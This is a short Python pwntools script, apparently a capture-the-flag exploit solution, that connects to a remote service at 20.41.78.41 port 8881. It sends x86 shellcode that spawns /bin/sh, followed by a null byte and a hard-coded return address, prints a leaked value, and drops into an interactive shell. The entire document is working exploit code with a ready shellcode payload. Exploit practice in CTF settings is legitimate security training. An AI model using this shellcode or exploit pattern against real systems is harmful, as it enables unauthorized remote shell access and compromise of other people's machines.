from pwn import *

context.log_level = 'debug'

sh = "\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x87\xe3\xb0\x0b\xcd\x80"

x = remote("20.41.78.41", 8881)

payload = sh
payload += "\x00"
payload += p32(0x08048087)


x.sendlineafter("Let's start the CTF:", payload)
print(hex(u32(x.recv(4))))
x.interactive()
#x.close()
